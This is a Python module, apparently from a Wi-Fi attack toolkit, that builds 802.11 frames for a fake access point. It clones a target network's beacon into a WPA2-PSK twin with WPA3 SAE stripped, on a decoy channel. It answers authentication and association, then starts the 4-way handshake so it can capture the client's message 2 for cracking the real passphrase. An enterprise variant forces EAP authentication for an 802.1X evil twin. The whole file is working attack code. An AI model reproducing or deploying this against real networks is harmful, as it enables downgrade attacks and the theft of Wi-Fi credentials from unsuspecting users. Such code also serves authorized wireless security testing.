"""AP-side 802.11 response builders for the FakeAP responder (802.11 spec, no I/O).

``beacon_clone`` rewrites a captured beacon to a WPA2-only PSK twin (SAE stripped) on the decoy
channel; ``auth_resp`` / ``assoc_resp`` / ``eapol_m1`` answer auth/assoc then open the 4-way with
our ANonce so the client's M2 (its MIC binds the real PSK) is captured.
"""
import struct
from typing import Optional

from wifit3.dot11.ie import (
    GENERIC_ENTERPRISE_RSN_IE,
    GENERIC_RSN_IE,
    ds_param_ie,
    ext_rates_ie,
    force_eap_akm,
    force_psk_akm,
    iter_information_elements,
    rates_ie,
)
from wifit3.dot11.eapol import data_header, eapol_key, LLC_SNAP_EAPOL
from wifit3.dot11.mac import mac_header

_CAP_ESS_PRIVACY = 0x0011
_CAP_ESS = 0x0001
_BEACON_HEAD = 36               # 24B MAC header + 12B fixed (timestamp, interval, capability)
_ELEMID_DS = 0x03
_ELEMID_RSN = 0x30
_ELEMID_HT_OP = 0x3D           # 61 HT Operation (primary channel + secondary-channel offset)
_ELEMID_VHT_OP = 0xC0          # 192 VHT Operation (channel width + center-frequency segments)
_ELEMID_RSNXE = 0xF4            # RSN Extended Caps: SAE hash-to-element, MFP-required advert
_M1_KEY_INFO = 0x008A          # Pairwise + Key ACK + key descriptor version 2 (HMAC-SHA1, PSK)
_CCMP_KEY_LEN = 16


def _resp_header(fc: bytes, bssid: bytes, client: bytes) -> bytes:
    return mac_header(fc, client, bssid, bssid)


def auth_resp(bssid: bytes, client: bytes) -> bytes:
    """Open-System Authentication response: algorithm 0, sequence 2, status 0."""
    return _resp_header(b"\xb0\x00", bssid, client) + b"\x00\x00\x02\x00\x00\x00"


def _aid_field(aid: int) -> bytes:
    """Association-ID field: 14-bit AID with both reserved high bits set."""
    return struct.pack("<H", 0xC000 | (aid & 0x3FFF))


def assoc_resp(bssid: bytes, client: bytes, aid: int = 1, channel: int = 1) -> bytes:
    """Association Response: ESS+Privacy capability, status 0 (success), AID, rate menus."""
    body = (
        struct.pack("<H", _CAP_ESS_PRIVACY)
        + b"\x00\x00"
        + _aid_field(aid)
        + rates_ie(channel)
        + ext_rates_ie(channel)
    )
    return _resp_header(b"\x10\x00", bssid, client) + body


def open_assoc_resp(
    bssid: bytes, client: bytes, aid: int = 1, channel: int = 1,
) -> bytes:
    """Association response for an unencrypted ESS (Privacy capability clear)."""
    body = (
        struct.pack("<H", _CAP_ESS)
        + b"\x00\x00"
        + _aid_field(aid)
        + rates_ie(channel)
        + ext_rates_ie(channel)
    )
    return _resp_header(b"\x10\x00", bssid, client) + body


def eapol_m1(bssid: bytes, client: bytes, anonce: bytes, replay: int = 1) -> bytes:
    """4-way message 1 (AP->client): our ANonce, no MIC."""
    payload = eapol_key(key_info=_M1_KEY_INFO, key_len=_CCMP_KEY_LEN, replay=replay, nonce=anonce)
    return data_header(to_ds=False, bssid=bssid, client=client) + LLC_SNAP_EAPOL + payload


def _ht_op_to_channel(elem: bytes, channel: int) -> bytes:
    body = bytearray(elem[2:])
    if len(body) >= 2:
        body[0] = channel & 0xFF          # primary channel
        body[1] &= ~0x07                  # clear secondary-offset (bits 0-1) + STA width (bit 2)
    return elem[:2] + bytes(body)


def _vht_op_to_20mhz(elem: bytes) -> bytes:
    body = bytearray(elem[2:])
    if len(body) >= 3:
        body[0] = 0                       # channel width 0 = 20/40 MHz
        body[1] = 0                       # center-freq seg 0
        body[2] = 0                       # center-freq seg 1
    return elem[:2] + bytes(body)


def _ht_op_primary_channel(elem: bytes, channel: int) -> bytes:
    """HT Operation: update primary channel only, keep secondary-offset / width."""
    body = bytearray(elem[2:])
    if len(body) >= 1:
        body[0] = channel & 0xFF
    return elem[:2] + bytes(body)


def _rewrite_beacon_tags(
    tags: bytes,
    decoy_channel: int,
    *,
    rewrite_rsn,
    generic_rsn: bytes,
    narrow_to_20mhz: bool,
) -> bytes:
    kept = bytearray()
    for tag_id, _body, elem in iter_information_elements(tags):
        if tag_id == _ELEMID_RSN:
            kept += rewrite_rsn(elem) or generic_rsn
        elif tag_id == _ELEMID_DS:
            kept += ds_param_ie(decoy_channel)
        elif tag_id == _ELEMID_HT_OP:
            if narrow_to_20mhz:
                kept += _ht_op_to_channel(elem, decoy_channel)
            else:
                kept += _ht_op_primary_channel(elem, decoy_channel)
        elif tag_id == _ELEMID_VHT_OP:
            if narrow_to_20mhz:
                kept += _vht_op_to_20mhz(elem)
            else:
                kept += elem
        elif tag_id != _ELEMID_RSNXE:
            kept += elem
    return bytes(kept)


def _beacon_clone(
    real_beacon: bytes,
    decoy_channel: int,
    bssid: Optional[bytes],
    *,
    rewrite_rsn,
    generic_rsn: bytes,
    narrow_to_20mhz: bool = True,
) -> bytes:
    if len(real_beacon) < _BEACON_HEAD:
        raise ValueError(f"beacon too short to rewrite: {len(real_beacon)} bytes")
    head = bytearray(real_beacon[:_BEACON_HEAD])
    head[22:24] = b"\x00\x00"
    if bssid is not None:
        head[10:16] = bssid          # Addr2 (SA)
        head[16:22] = bssid          # Addr3 (BSSID)
    tags = _rewrite_beacon_tags(
        real_beacon[_BEACON_HEAD:],
        decoy_channel,
        rewrite_rsn=rewrite_rsn,
        generic_rsn=generic_rsn,
        narrow_to_20mhz=narrow_to_20mhz,
    )
    return bytes(head) + tags


def beacon_clone(
    real_beacon: bytes,
    decoy_channel: int,
    bssid: Optional[bytes] = None,
    *,
    narrow_to_20mhz: bool = True,
) -> bytes:
    """The target's beacon rewritten to a WPA2-PSK twin. ``bssid`` rewrites Addr2/Addr3."""
    return _beacon_clone(
        real_beacon,
        decoy_channel,
        bssid,
        rewrite_rsn=force_psk_akm,
        generic_rsn=GENERIC_RSN_IE,
        narrow_to_20mhz=narrow_to_20mhz,
    )


def beacon_clone_enterprise(
    real_beacon: bytes,
    channel: int,
    bssid: Optional[bytes] = None,
    *,
    pmf_capable: bool = False,
    narrow_to_20mhz: bool = False,
) -> bytes:
    """Rewrite the target beacon for an 802.1X lab twin (SAE/RSNXE stripped, EAP AKM)."""
    def _rewrite_rsn(elem: bytes) -> Optional[bytes]:
        return force_eap_akm(elem, pmf_capable=pmf_capable)

    return _beacon_clone(
        real_beacon,
        channel,
        bssid,
        rewrite_rsn=_rewrite_rsn,
        generic_rsn=GENERIC_ENTERPRISE_RSN_IE,
        narrow_to_20mhz=narrow_to_20mhz,
    )


def probe_resp_from_beacon(beacon: bytes) -> bytes:
    """Probe response with the same capability field and IEs as ``beacon`` (RA zeroed)."""
    if len(beacon) < _BEACON_HEAD:
        raise ValueError(f"beacon too short for probe clone: {len(beacon)} bytes")
    bssid = beacon[10:16]
    hdr = mac_header(b"\x50\x00", b"\x00" * 6, bssid, bssid)
    return hdr + beacon[24:_BEACON_HEAD] + beacon[_BEACON_HEAD:]
